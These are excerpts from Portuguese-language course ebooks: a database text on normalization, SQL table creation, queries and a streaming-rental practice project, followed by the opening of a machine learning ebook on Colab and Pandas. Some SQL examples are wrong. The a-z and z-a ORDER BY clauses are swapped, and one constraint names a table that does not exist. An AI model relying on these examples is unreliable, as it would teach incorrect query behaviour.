3.2 Introdução à Normalização 
A determinação da estrutura de uma tabela é muito importante. Vamos olhar um 
exemplo que temos usado nesta unidade. 

 
 
Figura 3.5: Tabela vendedores 
 
Esta tabela tem um problema. Imagine que o nome de um dos departamentos seja 
alterado, teríamos que mudar todas as linhas que possuam esse departamento. Esse é um 
problema causado pela redundância. O nome do departamento se repete em vários lugares. 
O ideal é que estivesse em apenas um local e mudando em um, todos estariam atualizados. 
Um outro problema claro é o fato de neste exemplo um vendedor poder estar lotado 
em mais de um DEPARTAMENTO, esse é um atributo chamado multivalorado. A solução da 
tabela foi repetir o registro da matrícula do 2335, além de consumir mais espaço, isso é uma 
redundância que poderia causar inconsistência pois se algum dado desse vendedor se alterar, 
tem que lembrar de mudar nos dois pontos. 
A normalização é o processo que ajuda a resolver problemas como esses através da 
simplificação da estrutura do modelo de dados, determinando uma estrutura melhor. A 
normalização é a decomposição de uma tabela com o objetivo de eliminar redundâncias e 
inconsistências, reduzir falhas e facilitar as manutenções. 
 
3.2.1 Primeira Forma Normal (1FN) 
Uma tabela está na 1ª Forma Normal se não possui atributos multivalorados ou 
compostos. Vamos lembrar o que são atributos multivalorados e compostos (ou não 
atômicos). 
Atributos compostos são atributos que podem ser subdivididos em vários atributos. 
Por exemplo, a tabela: 
Funcionario (Codigo, Nome, Endereco) 
O atributo endereço é composto, uma vez que ele pode ser dividido em vários atributos 
como Rua, Número, Complemento, Cidade, Estado, Cep. 
Um atributo multivalorado é indicado como uma lista ou conjunto. Por exemplo, o 

45 
 
atributo telefone, caso uma pessoa possa ter mais de um telefone. 
Transformação para a 1FN 
• Separar o atributo composto em seus componentes. 
• Para o atributo multivalorado retirá-lo da tabela criando uma nova que tem o mesmo 
conjunto de atributos chave, mais o atributo multivalorado também como chave. 
 
Figura 3.6: Tabela vendedores 
 
VENDEDORES (Matricula, Nome, Telefone, Endereco (Rua, Cidade, CEP), 
Departamento, Horario). 
Analisando, temos o atributo DEPARTAMENTO multivalorado, um vendedor com dois 
departamentos de lotação, e o ENDERECO como multivalorado contendo os campos (Rua, 
Cidade, CEP). 
Para aplicar a primeira forma normal a estrutura ficaria: 
• Separar o atributo composto em seus componentes. 
VENDEDORES (Matricula, Nome, Telefone, Rua, Cidade, CEP, Departamento, 
Horario). 
Para o atributo multivalorado retirá-lo da tabela criando uma nova que tem o mesmo 
conjunto de atributos chave, mais o atributo multivalorado também como chave. 
VENDEDORES (Matricula, Nome, Telefone, Rua, Cidade, CEP, Horario) 
DEPARTAMENTO (Matricula, Departamento) 
Uma outra opção para substituir o atributo multivalorado é criar atributos no número 
máximo de valores estabelecido para o grupo, essa é uma abordagem menos genérica e 
que pode introduzir muitos valores nulos. 
VENDEDORES (Matricula, Nome, Telefone, Rua, Cidade, CEP, Departamento, 
Horario) 

 
Poderíamos resolver abaixo e não criar a segunda tabela. 
VENDEDORES (Matricula, Nome, Telefone, Rua, Cidade, CEP, Departamento1, 
Departamento2, Horario) 
Não vamos usar essa opção, observe que aqueles vendedores que não possuíssem 
dois departamentos teriam essa informação como nula. Um outro problema é se surgisse a 
possibilidade de alocar o vendedor a três ou mais departamentos, teríamos que mudar a 
estrutura do modelo. 
REGRA: uma relação está́ na 1FN se:  
• Todo os atributos devem ser atômicos e monovalorados. 
• A entidade não deve conter grupos multivalorados. 
 
3.2.2 Segunda Forma Normal (2FN) 
Para estar na 2ª Forma Normal todo atributo não chave deve ser totalmente 
dependente da chave primária e não apenas de parte dela. 
Transformação para a 2FN 
Separar os atributos que dependem de um subconjunto da chave, decompondo a 
relação em duas ou mais relações. 
Vamos usar como exemplo a relação: 
PEDIDO (Numero, Data, Codigo_peca, Descricao_peca, Quantidade, Preco)  
Verificar a dependência funcional. Pela regra, todos os atributos não chave devem 
depender de Numero e Codigo_peca juntos e não apenas de um deles. 
A Data depende de Número, não depende de Codigo_peca. 
Numero → Data 
A Descricao_peca só depende de Codigo_peca, não depende de Número. 
Codigo_peca → Descricao_peca 
A Quantidade e Preço dependem sim da chave completa. Número sozinho ou 
Codigo_peca não dependem os dois atributos. 
Numero , Codigo_peca  → Quantidade, Preco. 
O que faremos para resolver o problema é dividir o conjunto de atributos que 
compõem a chave primária em subconjuntos. Para cada um desses subconjuntos, criaremos 
uma relação, tendo esse subconjunto como sua chave primária. No nosso exemplo, teremos 

47 
 
uma relação com Numero e outra com Codigo_peca. Incluir os atributos da relação original 
em uma das relações criadas junto com a chave mínima da qual ele depende e atribuir um 
nome a cada relação resultante. 
• PEDIDO (Numero, Data) 
• PRODUTO (Codigo_peca, Descricao_peca) 
• VENDA (Numero, Codigo_peca, Quantidade, Preco) 
REGRA: uma relação está́ na 2FN se:  
• Se estiver na 1FN. 
• Todos os atributos que não pertencem à chave dependem de toda a chave (e não de 
um subconjunto da chave). 
 
3.2.3 Terceira Forma Normal (3FN) 
Nesta forma, normalmente não existem atributos não chave que sejam dependentes 
de outros atributos não chave, ou seja, possuem dependência transitiva. 
Se A → B e B → C  
então: 
A → C 
Transformação para a 3FN 
• Separar os atributos que dependem de outro atributo que não pertença a chave, 
decompondo a relação em duas ou mais relações. 
Vamos usar como exemplo a relação: 
CLIENTE (cpf, nome, telefone, cod_vendedor, nome_vendedor) 
Verificar a dependência funcional, pela regra não existem atributos não chave que 
sejam dependentes de outros atributos não chave. 
O nome_vendedor depende do cod_vendedor, ambos são não chave. 
cod_vendedor → nome_vendedor 
O que vamos fazer é retirar cod_vendedor, que não é uma chave candidata, da relação 
e, junto, os atributos que dependem deste determinante. Criaremos uma nova relação 
contendo todos os atributos da relação original que dependem deste determinante. O 
determinante será a chave primária da nova relação. 

 
• CLIENTE (cpf, nome, telefone) 
• VENDEDOR (cod_vendedor, nome_vendedor) 
REGRA: uma relação está́ na 3FN se:  
• Se estiver na 2FN. 
• Todos os atributos que não pertencem à chave dependem de nenhum atributo que 
também não pertence à chave. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

49 
 
 
MODELO FÍSICO  
Nesta unidade, vamos nos aprofundar no entendimento e na aplicação prática de 
conceitos essenciais em banco de dados, começando pelo Modelo Físico. Este tópico nos 
permitirá compreender como os dados são realmente armazenados e organizados em um 
ambiente de banco de dados. 
Em seguida, exploraremos a Linguagem SQL, uma ferramenta fundamental para 
interagir com bancos de dados relacionais. Através dela, você será capaz de realizar uma 
variedade de operações, desde consultas simples até manipulações complexas de dados, 
proporcionando maior flexibilidade e controle sobre suas bases de dados. 
Ao final dos estudos, você deverá ser capaz de: criar modelos físicos e consultas 
básicas usando Linguagem SQL. 
 
4.1 Modelo Físico 
Na etapa final do processo de desenvolvimento de um banco de dados, o modelo físico 
emerge como a representação tangível e concreta do projeto. Este modelo é o resultado de 
um esforço contínuo de ajustes e refinamentos, refletindo as necessidades e as demandas 
dinâmicas do ambiente operacional. É importante ressaltar que o modelo físico está sujeito 
a mudanças ao longo do ciclo de vida do banco de dados, adaptando-se às evoluções e às 
exigências do sistema em uso. 
 
4.2 Linguagem SQL 
A Linguagem SQL, ou Structured Query Language, é uma ferramenta essencial no 
mundo da gestão de bancos de dados. Utilizada para definir a estrutura das tabelas que irão 
armazenar os dados, bem como para estabelecer os relacionamentos entre esses dados. A 
SQL desempenha um papel crucial na organização e na gestão eficiente das informações. 
UNIDADE 4 

 
Além disso, a SQL permite extrair insights valiosos por meio de consultas complexas e 
análises detalhadas. 
 
4.3 Criação de Banco de Dados e Tabelas 
4.3.1. Definição de Tabelas, Atributos e Chaves 
A criação de um banco de dados começa com a definição das tabelas que irão compor 
sua estrutura fundamental. Cada tabela é projetada com atributos específicos que descrevem 
as características dos dados que serão armazenados. Além disso, são estabelecidas chaves 
primárias e estrangeiras para garantir a integridade e a consistência dos dados, facilitando a 
manipulação e a recuperação das informações armazenadas. 
Em SQL a cláusula para criar uma tabela é o CREATE TABLE. Sendo informado no 
mínimo os atributos da tabela e o tipo. 
 
 
Figura 4.1: Tabela empregador 
 
A cláusula SQL para a figura 4.1 seria: 
CREATE TABLE Empresa.Empregados ( 
 
codigo INT NOT NULL, 
     
nome VARCHAR(40) NOT NULL, 

51 
 
 
setor VARCHAR(2) NOT NULL, 
 
cargo VARCHAR(20) NOT NULL, 
 
salario REAL NOT NULL, 
 
PRIMARY KEY (codigo)); 
A parte PRIMARY KEY (codigo) define que o atributo código será a chave primária.  
Mais informações sobre SQL, consultar a bibliografia DAMAS, Luís. SQL - Structured 
Query Language. LTC, 2005.  
 
4.4 (DQL) Consultas Em SGBD 
4.4.1 Introdução às Consultas SQL 
As consultas SQL desempenham um papel central nos sistemas de gerenciamento de 
banco de dados (SGBD), permitindo que os usuários recuperem, atualizem e manipulem 
dados de maneira eficiente e intuitiva. Nesta seção, exploraremos os conceitos fundamentais 
por trás das consultas SQL, incluindo a seleção de dados de tabelas, a filtragem de resultados 
e a ordenação de informações. 
Supondo que para a tabela da figura 4.1 se deseje realizar as seguintes consultas: 
• 
Apresentar a listagem completa dos registros da tabela Empregados. 
• 
Apresentar uma listagem dos nomes e dos cargos de todos os registros da tabela 
Empregados. 
• 
Apresentar uma listagem dos nomes dos empregados do setor 1. 
• 
Listagem dos nomes e dos salários por ordem de nome (a-z). 
• 
Listagem dos nomes e dos salários por ordem de nome em formato descendente (z-
a). 
 
A resposta seria: 
• 
Apresentar a listagem completa dos registros da tabela Empregados: 
SELECT * FROM Empresa.Empregados. 

 
• 
Apresentar uma listagem dos nomes e dos cargos de todos os registros da tabela 
Empregados: 
SELECT nome, cargo FROM Empresa.Empregados. 
• 
Apresentar uma listagem dos nomes dos empregados do setor 1: 
SELECT nome FROM Empresa.Empregados WHERE setor = '1’. 
• 
Listagem dos nomes e dos salários por ordem de nome (a-z): 
SELECT nome, salario FROM Empresa.Empregados ORDER BY nome DESC. 
• 
Listagem dos nomes e dos salários por ordem de nome em formato descendente (z-
a): 
SELECT nome, salario FROM Empresa.Empregados ORDER BY nome ASC. 
Mais informações sobre SQL, consultar a bibliografia DAMAS, Luís. SQL - Structured 
Query Language. LTC, 2005.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 

53 
 
 
MANIPULAÇÃO DE DADOS  
Nesta unidade, vamos aplicar todos os conhecimentos adquiridos nas unidades 
anteriores em um projeto prático completo. 
Ao final dos estudos, você deverá ser capaz de: resolver um problema com a criação 
do modelo conceitual, lógico e físico de banco de dados. 
 
5.1 Projeto Prático 
Considere o cenário. 
Os clientes podem desejar encontrar os filmes estrelados pelo seu ator predileto. Por 
isso, é necessário manter a informação dos atores de cada filme. Para cada ator os clientes 
desejam saber o nome real e/ou nome artístico, bem como a data de nascimento. O serviço 
de streaming possui muitos clientes cadastrados. Somente clientes cadastrados podem 
alugar filmes. Sobre os filmes, cada um tem um ID e um título. Além disso, um filme pode 
ter apenas uma categoria, por exemplo, comédia. Cada categoria tem um código e uma 
descrição. Para cada cliente é necessário saber seu CPF, nome e seu sobrenome, seu telefone 
e seu endereço. Além disso, cada cliente recebe um número de associado. Finalmente, 
desejamos saber que filmes cada cliente tem alugado. Um cliente pode ter vários filmes em 
um instante no tempo. Deve ser registrado a data dos aluguéis.  
As tabelas abaixo, apresentam os dados que devem ser armazenados no banco de 
dados. 
 
UNIDADE 5 

 
 
 
 
 
Crie o modelo conceitual, o modelo lógico (NORMALIZADO) e o modelo físico. Monte 
as SQL para responder: 
• 
Apresentar a listagem completa dos registros dos Clientes. 
• 
Apresentar uma listagem dos nomes de todos os Atores. 
• 
Apresentar uma listagem dos filmes locados do filme 1. 
• 
Apresentar uma listagem dos filmes e a descrição da categoria. 
 

55 
 
1) Modelo Conceitual 
 
 
2) Modelo Lógico 
• Cliente (cpf, nome, sobrenome, endereço)  
• Telefone (fk_cpf_cliente, telefone)  
o fk_cpf_cliente referencia Cliente 
• Filme (id, título, fk_cod_categoria)  
o fk_cod_categoria referencia Categoria 
• Categoria (codigo, descricao)  
• Locacao (fk_cpf_cliente, fk_id_filme, dtLocacao)  
o fk_cpf_cliente referencia Cliente 
o fk_id_filme referencia Filme  
• Ator (id, data_de_nascimento,nome_popular, nome_artistico)  
• Filme_Atores (fk_id_filme, fk_id_ator) 
o fk_id_fime referencia Filme 
o fk_id_ator referencia Ator  
 
 
Modelo Físico 
CREATE SCHEMA Streaming. 
 
CREATE TABLE Streaming.Cliente ( 
 
cpf VARCHAR(11) NOT NULL, 

 
     
nome VARCHAR(40) NOT NULL, 
 
sobrenome VARCHAR(40) NOT NULL, 
 
endereco VARCHAR(40) NOT NULL, 
 
PRIMARY KEY (cpf)); 
 
CREATE TABLE Streaming.Telefone ( 
 
fk_cpf_cliente VARCHAR(11) NOT NULL, 
     
telefone VARCHAR(10) NOT NULL, 
 
PRIMARY KEY (fk_cpf_cliente, telefone)); 
 
CREATE TABLE Streaming.Filme ( 
 
id INT NOT NULL, 
     
titulo VARCHAR(80) NOT NULL, 
 
 fk_cod_categoria INT NOT NULL, 
 
PRIMARY KEY (id)); 
 
CREATE TABLE Streaming.Categoria ( 
 
codigo INT NOT NULL, 
     
descricao VARCHAR(40) NOT NULL, 
 
PRIMARY KEY (codigo)); 
 
CREATE TABLE Streaming.Locacao ( 
 
fk_cpf_cliente VARCHAR(11) NOT NULL, 
     
fk_id_filme INT NOT NULL, 
 
dtLocacao VARCHAR(10) NOT NULL, 
 
PRIMARY KEY (fk_cpf_cliente, fk_id_filme, dtLocacao)); 
 
CREATE TABLE Streaming.Ator ( 
 
id INT NOT NULL, 
     
data_de_nascimento VARCHAR(10) NOT NULL, 
 
nome_popular VARCHAR(40) NOT NULL, 
  
nome_artistico VARCHAR(40) , 

57 
 
 
PRIMARY KEY (id)); 
 
CREATE TABLE Streaming.Filme_Ator ( 
 
fk_id_filme INT NOT NULL, 
     
fk_id_ator INT NOT NULL, 
 
PRIMARY KEY (fk_id_filme, fk_id_ator)); 
 
ALTER TABLE Streaming.Telefone ADD CONSTRAINT fk_cpf_cliente  
    FOREIGN KEY (fk_cpf_cliente ) 
    REFERENCES Cliente (cpf) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
ALTER TABLE Streaming.Filme ADD CONSTRAINT fk_cod_categoria 
    FOREIGN KEY (fk_cod_categoria) 
    REFERENCES Categoria (codigo) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
ALTER TABLE Streaming.Locacao ADD CONSTRAINT fk_cpf_cliente_locacao 
    FOREIGN KEY (fk_cpf_cliente) 
    REFERENCES Cliente (cpf) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
ALTER TABLE Streaming.Locacao ADD CONSTRAINT fk_id_filme  
    FOREIGN KEY (fk_id_filme ) 
    REFERENCES Filme (id) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
ALTER TABLE Streaming.Filme_Atores ADD CONSTRAINT fk_id_filme_atores 

 
    FOREIGN KEY (fk_id_filme) 
    REFERENCES Filme (id) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
ALTER TABLE Streaming.Filme_Ator ADD CONSTRAINT fk_id_ator  
    FOREIGN KEY (fk_id_ator ) 
    REFERENCES Ator (id) 
    ON DELETE RESTRICT 
    ON UPDATE NO ACTION; 
 
3) Inserção dos dados 
INSERT INTO Streaming.Cliente(cpf, nome, sobrenome, endereco) VALUES ('1', 'Joao', 
'Silva', 'Rua A'); 
INSERT INTO Streaming.Cliente(cpf, nome, sobrenome, endereco) VALUES ('2', 'Maria', 
'Silva', 'Rua B'); 
INSERT INTO Streaming.Cliente(cpf, nome, sobrenome, endereco) VALUES ('3', 'José', 
'Silva', 'Rua C'); 
INSERT INTO Streaming.Cliente(cpf, nome, sobrenome, endereco) VALUES ('4', 'Pedro', 
'Silva', 'Rua D’); 
INSERT INTO Streaming.Telefone(fk_cpf_cliente, telefone) VALUES ('1', '86753412'); 
INSERT INTO Streaming.Telefone(fk_cpf_cliente, telefone) VALUES ('1', '89237772'); 
INSERT INTO Streaming.Telefone(fk_cpf_cliente, telefone) VALUES ('2', '78658922'); 
INSERT INTO Streaming.Telefone(fk_cpf_cliente, telefone) VALUES ('3', '86893377'); 
INSERT INTO Streaming.Telefone(fk_cpf_cliente, telefone) VALUES ('4', '97678277’); 
INSERT INTO Streaming.Categoria(codigo, descricao) VALUES (1, 'Comédia'); 
INSERT INTO Streaming.Categoria(codigo, descricao) VALUES (2, 'Ação’); 
INSERT INTO Streaming.Filme(id, titulo, fk_cod_categoria) VALUES (1, 'Filme 1',1); 
INSERT INTO Streaming.Filme(id, titulo, fk_cod_categoria) VALUES (2, 'Filme 2',1); 
INSERT INTO Streaming.Filme(id, titulo, fk_cod_categoria) VALUES (3, 'Filme 3',2); 
INSERT INTO Streaming.Locacao(fk_cpf_cliente, fk_id_filme, dtLocacao) VALUES (1, 1, 
'2014-03-07'); 

59 
 
INSERT INTO Streaming.Locacao(fk_cpf_cliente, fk_id_filme, dtLocacao) VALUES (2, 1, 
'2014-03-07'); 
INSERT INTO Streaming.Locacao(fk_cpf_cliente, fk_id_filme, dtLocacao) VALUES (3, 2, 
'2014-03-07'); 
INSERT INTO Streaming.Ator(id, data_de_nascimento, nome_popular, nome_artistico) 
VALUES (1,'1987-10-17', 'Brian Cool', NULL); 
INSERT INTO Streaming.Ator(id, data_de_nascimento, nome_popular, nome_artistico) 
VALUES (2,'1978-04-23', 'Alan McDonald', 'MC B'); 
INSERT INTO Streaming.Ator(id, data_de_nascimento, nome_popular, nome_artistico) 
VALUES (3,'2000-09-25', 'Deborah Hilton', NULL); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (1,2); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (2,2); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (2,1); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (3,3); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (3,2); 
INSERT INTO Streaming.Filme_Ator(fk_id_filme, fk_id_ator) VALUES (3,1); 
 
4) Consultas 
#Apresentar a listagem completa dos registros dos Clientes; 
SELECT * FROM Streaming.Cliente; 
 
#Apresentar uma listagem dos nomes de todos os Atores; 
SELECT * FROM Streaming.Ator; 
 
#Apresentar uma listagem dos dos filmes locados do filme 1; 
SELECT * FROM Streaming.Locacao WHERE fk_id_filme = 1; 
 
#Apresentar uma listagem dos filmes e a descricao da categoria; 
SELECT f.id, f.titulo, c.descricao AS categoria  
FROM Streaming.Filme AS f, Streaming.Categoria AS c  
WHERE f.fk_cod_categoria = c.codigo ; 

 
PARA FINALIZAR 
Chegamos ao término da nossa jornada de exploração sobre Banco de Dados, e 
reconheço sua persistência e dedicação até aqui. Parabenizo-o por sua perseverança e 
comprometimento durante todo o curso. Espero que este material tenha sido uma fonte de 
enriquecimento para você, proporcionando valiosos conhecimentos sobre o intrigante 
universo dos bancos de dados. 
Durante nossa jornada, exploramos os fundamentos essenciais de bancos de dados, 
desde a distinção entre dados e informações, até a importância dos Sistemas Gerenciadores 
de Banco de Dados (SGBD) na organização e manipulação eficiente das informações. 
Abordamos temas como o Modelo Entidade-Relacionamento (MER), a normalização de 
tabelas e os conceitos-chave da linguagem SQL. 
Acredito que os bancos de dados são a espinha dorsal de qualquer sistema de 
informação moderno, e compreender profundamente seus princípios e práticas é 
fundamental para qualquer profissional da área de tecnologia da informação. Com o advento 
de grandes volumes de dados e a necessidade crescente de análise e processamento 
eficiente, o conhecimento em banco de dados torna-se ainda mais crucial. 
Lembre-se de que os conceitos e habilidades adquiridos aqui não apenas enriquecerão 
sua carreira profissional, mas também podem ser aplicados em uma variedade de contextos 
pessoais e profissionais. A capacidade de projetar e gerenciar bancos de dados eficazes não 
apenas aumenta sua empregabilidade, mas também abre portas para oportunidades de 
inovação e solução de problemas em diversas áreas. 
Agora, convido você a continuar sua jornada de aprendizado e aprofundamento neste 
campo emocionante. Explore novas técnicas, aprimore suas habilidades e mantenha-se 
atualizado com as últimas tendências e tecnologias em banco de dados. O campo de bancos 
de dados está em constante evolução, e seu potencial como profissional é verdadeiramente 
ilimitado. 
Parabenizo você por sua dedicação e participação ativa neste curso. Desejo-lhe 
sucesso em sua trajetória profissional e espero que este material seja apenas o começo de 
uma jornada repleta de realizações e descobertas no vasto mundo dos bancos de dados. 
Joelma de Moura Ferreira 

 
Sobre o autor 
 
Joelma de Moura Ferreira é doutora em Ciência da Computação pela Universidade Federal de Goiás, 
com mestrado em Ciência da Computação pela Universidade Federal de Goiás, MBA em Gerenciamento 
de Projetos pela Fundação Getúlio Vargas, especialização em Redes de Computadores pela Universidade 
Salgado de Oliveira, MBA em Tecnologia para Negócios: AI, Data Science e Big Data pela Pontifícia 
Universidade Católica do Rio Grande do Sul e graduação em Ciência da Computação pela Universidade 
Católica de Goiás. Atuou por mais de 20 anos como docente de graduação e pós-graduação em diversas 
instituições de ensino superior, incluindo Faculdade Sul-Americana, Universidade Paulista, Faculdade 
Estácio de Sá de Goiás, Pontifícia Universidade Católica, Centro Universitário Alves Farias. Desempenhou 
a função de coordenadora do curso de graduação de Sistemas de Informação e dos cursos de pós-
graduação em Gestão de Projetos, Gestão de Tecnologia da Informação e Arquitetura e Engenharia de 
Software no Centro Universitário Alves Faria, onde também exerceu a atividade de pesquisadora no 
Mestrado em Desenvolvimento R Fora do domínio acadêmico, exerce a função de Cientista de Dados no 
Tribunal de Justiça do Distrito Federal e Territórios. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
Referências Bibliográficas 
 
DAMAS, L. SQL - Structured Query Language. Rio de Janeiro: LTC, 2005.  
 
ELMASRI, R.; NAVATHE, S. B. Sistemas de banco de dados. 7ª ed. São Paulo: Pearson Prentice 
Hall, 2019.  
 
GRAVES, M. Projeto de Banco de Dados com XML. São Paulo: Pearson Prentice Hall, 2003.  
 
LEAL, G. C. L. Linguagem, programação e banco de dados: guia prático de aprendizagem. 
Curitiba: Intersaberes, 2015.  
 
MACHADO, F. N. R. Banco de Dados - Projeto e Implementação. São Paulo: Erica, 2020. 
 
MEDEIROS, L. F. Banco de dados: princípios e prática. Curitiba: Intersaberes, 2012.  
 
PUGA, S.; FRANÇA, E.; GOYA, M. Banco de dados: implementação em SQL, PL/SQL e Oracle 
11g. São Paulo: Pearson Prentice Hall, 2015.  
 
VICCI, C. (org.). Banco de Dados. Rio de Janeiro: LTC, 2004.  
 
 
 
 
 
 
 
 
 
 
 
 
 


--- Fim do arquivo: eBook - Banco de Dados 1.pdf ---

--- Começo do arquivo: eBook - Machine Learning.pdf ---

 
 
extremamente sofisticadas e inteligentes em ambientes industriais por exemplo, 
os quais são constituídos por diversos equipamentos e a redução de custo e 
aumento na eficiência é um fator crucial para o sucesso do negócio. 
Dados vem sendo considerados como o novo petróleo a algum tempo e 
devido à essa importância é imprescindível ter conhecimento dessa área 
atualmente. Aprender ML, mesmo que não seja para se tornar um especialista, 
mas, ao menos entender do que se trata é um diferencial. 
Boa leitura e estudos! 
Prof. Dr. Thiago Santana Lemes 
 
 

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
Proporcionar uma compreensão dos princípios, algoritmos e aplicações do 
aprendizado de máquina, capacitando os estudantes a aplicar esses 
conhecimentos na solução de problemas reais, na análise de dados e no 
desenvolvimento de sistemas inteligentes.  
OBJETIVOS ESPECÍFICOS 
• Conhecer os conceitos fundamentais do aprendizado de máquina 
incluindo aprendizado supervisionado e não supervisionado; 
• Desenvolver habilidades práticas em modelagem, seleção de algoritmos, 
treinamento de modelos e avaliação de desempenho; 
• Entender os fundamentos da análise exploratória de dados; 
• Implementar modelos de machine learning; 
• Compreender questões éticas e o impacto social do aprendizado de 
máquina, 
incluindo 
viés 
algorítmico, 
privacidade 
de 
dados, 
e 
responsabilidade na tomada de decisões.  
 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Conceitos iniciais de machine learning 
Unidade 2: Pré-processamento de Dados 
Unidade 3: Aprendizado supervisionado – Regressão 
Unidade 4: Aprendizado supervisionado – Classificação parte 1 
Unidade 5: Aprendizado supervisionado – Classificação parte 2 
 
 
 

 
 
UNIDADE 1 CONCEITOS INICIAIS DE MACHINE LEARNING 
 
É com grande prazer que damos início a essa jornada de aprendizado e 
descobertas. Nesta unidade, teremos a oportunidade de explorar os conceitos 
iniciais do fascinante universo de machine learning. 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: 
• Definição de conceitos básicos da estatística. 
• Configuração do ambiente. 
 
 

 
 
1.1 AMBIENTE DE DESENVOLVIMENTO NO GOOGLE COLAB 
O Google fornece uma plataforma de desenvolvimento para projetos de 
ciência de dados e inteligência artificial chamada Colab. Esse ambiente é gratuito 
para utilização, podendo fornecer recursos computacionais extras por meio de 
pagamento. A Figura 1.1 abaixo mostra a página inicial que pode ser acessada 
por meio do link https://colab.research.google.com. 
 
Figura 1.1: Página inicial do Google Colab 
A plataforma possui diversos exemplos e tutoriais e todos estão 
acessíveis já na aba Exemplos como mostrado na Figura 1.1. Para iniciar um 
projeto basta clicar no botão azul Novo notebook. Todos os códigos que serão 
apresentados nesse texto podem ser desenvolvidos no ambiente do Google 
Colab. A vantagem é que a maioria das bibliotecas padrão no universo de 
machine learning já estão instaladas facilitando muito o início do 
desenvolvimento de um projeto. Obviamente é possível instalar bibliotecas caso 
elas não estejam disponíveis de início no ambiente. 
 
 

 
 
1.2. ANÁLISE EXPLORATÓRIA DE DADOS 
Sempre que se inicia um projeto de Aprendizado de Máquina (Machine 
Learning ou ML) uma análise exploratória de dados é necessária. As tomadas 
de decisão, escolha de algoritmos e escolha de apresentação de resultados 
passa pelo completo entendimento do conjunto de dados que está sendo 
utilizado. 
Como primeiros passos, é preciso visualizar todas as variáveis 
disponíveis, entender os seus tipos (float, int, str), no caso dos dados numéricos, 
como estão distribuídos. Variáveis numéricas podem ser provenientes de 
medições ou registros como altura e peso de indivíduos ou mesmo indicações 
de que algo estava ligado ou desligado (funcionando ou não funcionando, 
presente ou ausente, ...) ou se determinada ação foi tomada ou não. Variáveis 
que indicam dois estados são conhecidas como binárias e podem ser 
representadas por palavras (masculino/feminino - string) ou por booleanos 
(Verdadeiro/Falso – True/False). Além disso, essa lógica de representar dois 
estados pode ser estendida para diversos outros. A Figura 1.2 a seguir ilustra 
alguns tipos de variáveis. 
 
 
Figura 1.2: Representação de um dataframe contendo alguns tipos 
diferentes de variáveis 
 

 
 
Na Figura 1.2, as variáveis “Sexo”, “Escolaridade”, “Possui casa própria”, 
“Possui trabalho CLT” e “Já realizou algum procedimento cirúrgico” são 
categóricas pois possuem um número finito de categorias (opções) 
representadas. Altura é uma variável de ponto flutuante (float) uma vez que 
representa uma informação com maior precisão. Peso é uma variável do tipo 
inteiro (int). A Figura 1.2 foi gerada utilizando a biblioteca Pandas (The pandas 
development team, 2024) e o trecho de código abaixo (Figura 1.3) ilustra isso, 
sendo a primeira linha utilizada para importar a biblioteca. 
 
 
Figura 1.3: Geração de dados fictícios utilizando a biblioteca Pandas 
A biblioteca Pandas fornece uma maneira simples de obter os tipos de 
todas as variáveis contidas no dataframe, bastando utilizar o comando .info() 
(Figura 1.4). As variáveis do tipo inteiro aparecem na coluna Dtype como int64, 
variáveis do tipo float aparecem como float64, variáveis do tipo string aparecem 
como object e variáveis do tipo booleano aparecem como bool. 
 
Figura 1.4: Inspeção do tipo de dados utilizando o Pandas 

 
 
Após essa inspeção inicial nos dados é de muita importância verificar as 
medidas de tendência central, dispersão dos dados, correlações entre variáveis 
e finalmente uma representação visual. A Figura 1.5 abaixo mostra a utilização 
do comando describe() do Pandas que retorna de uma só vez a média, o desvio 
padrão, valores mínimos e máximos e os percentis dos dados, sendo um 
comando extremamente útil. 
 
Figura 1.5: Descrição dos dados utilizando Pandas e describe 
Para verificar a correlação entre as variáveis pode-se utilizar o comando corr() 
do Pandas como mostrado na Figura 1.6 abaixo. 
 
Figura 1.6: Correlação entre as variáveis 

 
 
A Figura 1.7 ilustra uma análise em relação à Escolaridade. É fácil verificar 
que pessoas com Pós-graduação são a minoria e que a maioria das pessoas 
possuem ensino Médio. 
 
Figura 1.7: Contagem do nível de escolaridade dos indivíduos 
Vale ressaltar que para as medidas de tendência central e a correlação 
somente as variáveis numéricas foram utilizadas. Variáveis categóricas são 
melhor entendidas por meio de contagens e distribuição como na Figura 1.7 
acima. Para entender um pouco melhor os dados é importante gerar 
visualizações. Aqui serão apresentados alguns histogramas (Figura 1.8) que dão 
início ao processo de entendimento dos dados, mas ao longo das próximas 
unidades, diversos outros gráficos serão apresentados. O comando .hist() do 
Pandas facilita a construção desses gráficos. 

 
 
 
Figura 1.8: Histogramas para as variáveis Peso e Altura 
 
 
 
 

 
 
UNIDADE 2 PRÉ-PROCESSAMENTO DE DADOS 
 
Tivemos uma ideia básica a respeito de estatística além de algumas ideias 
a respeito de visualização de dados. Foi possível perceber que existem diversos 
conceitos envolvidos e que eles são essenciais para o bom andamento de um 
projeto que tem por base os dados. 
Nessa nova unidade iremos caminhar no sentido de realizar manipulações 
nos conjuntos de dados e deixar eles mais limpos/validados para serem 
utilizados nos modelos de machine learning. 
OBJETIVOS DA UNIDADE 2 
Ao final dos estudos, você deverá ser capaz de: 
• Realizar o pré-processamento dos dados 
 
• Validar um conjunto de dados 
 
 
 

 
 
2.1. PRÉ-PROCESSAMENTO DE DADOS 
Na maioria dos projetos reais que envolvem análise de dados existem 
problemas relacionados à qualidade dos dados. Esses problemas podem surgir 
por diversos motivos, como por exemplo um conjunto de dados que é formado 
pela aquisição de informações de sensores e que em alguns momentos falham, 
deixando registros em branco, ou mesmo dados provenientes de pesquisas, os 
quais podem ter registros faltantes. Para lidar com esses dados incompletos 
